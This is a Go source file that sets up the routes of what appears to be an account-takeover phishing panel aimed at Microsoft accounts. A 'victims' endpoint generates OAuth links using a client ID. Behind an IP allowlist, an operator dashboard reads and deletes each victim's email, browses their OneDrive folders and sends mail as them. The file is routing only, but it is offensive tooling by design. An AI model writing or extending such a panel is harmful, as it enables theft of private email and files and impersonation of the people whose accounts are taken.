package app

import (
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/gotuna/gotuna"
	"gorm.io/gorm"
)

// App is the main dependency store.
type App struct {
	gotuna.App
}

// MakeApp creates and configures the App
func MakeApp(app App, Db *gorm.DB, clientID string, ip string) App {
	if app.Logger == nil {
		app.Logger = log.New(io.Discard, "", 0)
	}
	if app.Locale == nil {
		app.Locale = gotuna.NewLocale(map[string]map[string]string{})
	}
	// custom view helpers
	app.ViewHelpers = []gotuna.ViewHelperFunc{
		func(w http.ResponseWriter, r *http.Request) (string, interface{}) {
			return "iterate", func(n int64) []int {
				var pages []int
				for i := 0; i < int(n); i++ {
					pages = append(pages, i)
				}
				return pages
			}
		},
	}
	// middlewares for all routes
	app.Router.Handle("/error", handlerError(app)).Methods(http.MethodGet, http.MethodPost)
	app.Router.Use(app.Recoverer("/error"))
	app.Router.Use(app.Logging())
	app.Router.Use(app.StoreParamsToContext())
	app.Router.Use(app.StoreUserToContext())
	app.Router.Methods(http.MethodOptions)
	app.Router.Use(app.Cors())

	// for logged in users
	user := app.Router.NewRoute().Subrouter()
	user.Use(allowIP(ip))
	user.Use(app.Authenticate("/"))
	user.Handle("/dashboard", handlerDashboard(app, Db)).Methods(http.MethodGet)
	user.Handle("/dashboard/{id}", handlerVictim(app, Db)).Methods(http.MethodGet)
	user.Handle("/sendMail/{id}", sendMail(app, Db)).Methods(http.MethodPost)
	user.Handle("/emails/{id}", displayEmails(app, Db)).Methods(http.MethodGet)
	user.Handle("/emails/{id}/delete/{emailID}", deleteEmail(app, Db)).Methods(http.MethodGet)
	user.Handle("/onedrive/{id}", displayFiles(app, Db)).Methods(http.MethodGet)
	user.Handle("/onedrive/folder/{id}/{folderID}", displayFilesinFolder(app, Db)).Methods(http.MethodGet)
	user.Handle("/logout", handleLogout(app)).Methods(http.MethodGet)

	guests := app.Router.NewRoute().Subrouter()
	guests.Use(allowIP(ip))
	guests.Handle("/", handlerLogin(app)).Methods(http.MethodGet, http.MethodPost)

	victims := app.Router.NewRoute().Subrouter()
	victims.Use(protect())
	//used for personal microsoft accounts
	victims.Handle("/generate", generate(app, Db, clientID)).Methods(http.MethodGet)
	// used for work or school accounts
	//victims.Handle("/generate/{domain}", generateForWork(app, Db, clientID)).Methods(http.MethodGet)

	app.StaticPrefix = strings.TrimRight(app.StaticPrefix, "/")
	// serve files from the static directory
	app.Router.PathPrefix(app.StaticPrefix).
		Handler(http.StripPrefix(app.StaticPrefix, app.ServeFiles(handlerNotFound()))).
		Methods(http.MethodGet)
	return app
}
